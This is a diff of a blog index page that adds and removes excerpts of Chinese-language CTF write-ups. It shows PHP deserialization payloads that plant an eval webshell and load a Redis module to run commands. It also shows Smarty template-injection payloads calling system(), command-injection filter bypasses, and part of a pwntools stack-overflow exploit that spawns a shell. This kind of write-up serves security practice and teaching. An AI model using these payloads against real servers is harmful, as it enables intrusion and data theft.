@@ -131,6 +131,103 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/08/31/天翼杯2021-esay-eval-wp/" >天翼杯2021-esay_eval-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-31
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/364">题目链接</a>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>明显反序列化执行<code>5#eval</code>，但是需要绕过<code>8#__wakeup</code></p>
+<p><strong>wakeup绕过方式</strong>即让反序列化出来的类元素个数与实际元素个数不同</p>
+<p>尝试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;eval(\$_POST[&#x27;cmd&#x27;]);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>但过不了检测，会提示<code>you want to bypass wakeup ? no !</code></p>
+<p>代码中正则匹配了<code>&quot;B&quot;:x</code>和<code>&quot;A&quot;:x</code>类型中对应下标为1（即第2个，即A）的x个数是否为1，这里为2所以过不了检测；有两种绕过方法</p>
+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>1可以过检测，那我们就让实际元素个数不为1（这里多加一个成员变量），也可以绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="string">&#x27;A&quot;:a&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;s:1:&quot;b&quot;;i:0;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>php对类名大小写不敏感，将<code>A1</code>替换为<code>a2</code>即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;a&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过后执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);&quot;</span>;&#125;&#125;&amp;cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p><code>phpinfo()</code>可以执行，但是<code>system</code>尝试发现被过滤</p>
+<p>连接蚁剑发现同一目录下有一个vim备份文件<code>config.php.swp</code>  vim打开后发现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>给了<code>REDIS</code>的密码<code>you_cannot_guess_it</code></p>
+<p>从<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server%E4%B8%AD%E4%B8%8B%E8%BD%BD%60exp.so%60">https://github.com/Dliv3/redis-rogue-server中下载`exp.so`</a>  并在蚁剑中上传</p>
+<p>蚁剑插件商城中下载  Redis管理   然后右键链接选择该插件</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x1.png?raw=true" alt="m"></p>
+<p>点击新建然后输入密码即可连接成功，这时随便右键一个<code>db</code>选择执行命令</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x2.png?raw=true" alt="m"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /<span class="keyword">var</span>/www/html/exp.so</span><br><span class="line">system.exec <span class="string">&quot;ls /;cat /f*&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x3.png?raw=true" alt="m"></p>
+
+	
+	</div>
+  <a type="button" href="/2023/08/31/天翼杯2021-esay-eval-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/08/30/HDCTF2023-SearchMaster-wp/" >HDCTF2023-SearchMaster-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-08-30
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3785">题目链接</a>  </p>
+<p>页面提示 <code>模板都一样我很抱歉OVO BUT YOU CAN POST ME A data</code></p>
+<p>post  data对应回显</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="number">1</span>   <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="number">2</span>*<span class="number">2</span>&#125;   <span class="number">4</span>;	<span class="comment"># 明显SSTI模板注入</span></span><br><span class="line"></span><br><span class="line">data=&#123;config&#125; </span><br><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template <span class="string">&quot;string:&lt;!doctype html&gt; &lt;html lang=&quot;</span>en<span class="string">&quot; class=&quot;</span>n...<span class="string">&quot; on line 19 &quot;</span>&lt;p&gt;&#123;config&#125;&lt;/p&gt;<span class="string">&quot; unknown tag &#x27;config&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 19</span></span><br><span class="line"><span class="string"># 发现是smarty插件</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;$smarty.version&#125;</code>可以看到smarty的版本号</p>
+<p>两种方式实现代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag_13_searchmaster&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;	<span class="comment"># 法一</span></span><br><span class="line">data=&#123;&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag_13_searchmaster&#x27;</span>)&#125;&#125;	<span class="comment"># 法二</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+	
+	</div>
+  <a type="button" href="/2023/08/30/HDCTF2023-SearchMaster-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/08/30/GKCTF2021-easycms-wp/" >GKCTF2021-easycms-wp</a>
 								</h3>
 							</div>
@@ -512,91 +609,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/21/SWPUCTF2021-finalrce-wp/" >SWPUCTF2021-finalrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-21
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/438">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>执行任意命令都无回显，尝试执行<code>?url=whoami;sleep 3</code>发现确实有延时，说明命令执行成功</p>
-<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>tee命令用于读取标准输入的数据，并将其内容输出成文件，以下几种均可</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=l\s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=l<span class="string">&#x27;&#x27;</span>s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=l``s / | <span class="built_in">tee</span> 1.txt</span><br><span class="line">?url=<span class="built_in">dir</span> / | <span class="built_in">tee</span> 1.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>1.txt</code>可以看到ls的结果，看到<code>flllllaaaaaaggggggg</code>；由于<code>la</code>被过滤，也要绕过</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?url=c<span class="string">&#x27;&#x27;</span>at /flllll\aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">tac</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">nl</span> /flllll????????????? | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">head</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">tail</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=tailf /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br><span class="line">?url=<span class="built_in">sort</span> /flllll<span class="string">&#x27;&#x27;</span>aaaaaaggggggg | <span class="built_in">tee</span> 2.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问<code>2.txt</code>即可看到flag</p>
-
-	
-	</div>
-  <a type="button" href="/2023/08/21/SWPUCTF2021-finalrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/19/HS2019-storytime-wp/" >nightmare 2.15.HS2019-storytime-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-19
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/hs19_storytime">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>文件夹包含<code>libc.so.6</code>，关于替换动态链接库，可见 <a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/05/30/change_libc/">https://antel0p3.github.io/2023/05/30/change_libc/</a></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec storytime</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">$ ./storytime</span><br><span class="line">HSCTF PWNNNNNNNNNNNNNNNNNNNN</span><br><span class="line">Tell me a story:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HSCTF PWNNNNNNNNNNNNNNNNNNNN\n&quot;</span>, <span class="number">0x1D</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Tell me a story: \n&quot;</span>, <span class="number">0x12</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x190</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>明显存在栈溢出</p>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><ol>
-<li><p>通过调用<code>write@plt</code>（第二个参数为<code>write@got</code>）来泄露write实际地址进而获取libc基地址，输出后跳转回main待后续攻击</p>
-<p>注意通常只有<strong>程序执行过</strong>的库函数会出现在plt和got中，所以不能直接用<code>puts</code>来输出</p>
-</li>
-<li><p>找到<code>one_gadget</code>或构造system pop链，获取shell</p>
-<p>one_gadget安装使用：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ apt install ruby</span><br><span class="line">$ gem install one_gadget</span><br><span class="line"></span><br><span class="line">$ one_gadget libc.so.6</span><br><span class="line">0x45216 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
-
-<p>以上得到的地址在满足条件下可以直接执行<code>/bin/sh</code>，可以作为跳转地址，都尝试失败后就只能通过system获取shell了</p>
-</li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./storytime&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./storytime&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x40069b</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40048e</span></span><br><span class="line">rdi_ret = <span class="number">0x400703</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x400701</span></span><br><span class="line">rax_ret = <span class="number">0x33544</span></span><br><span class="line">main = <span class="number">0x40062E</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>, <span 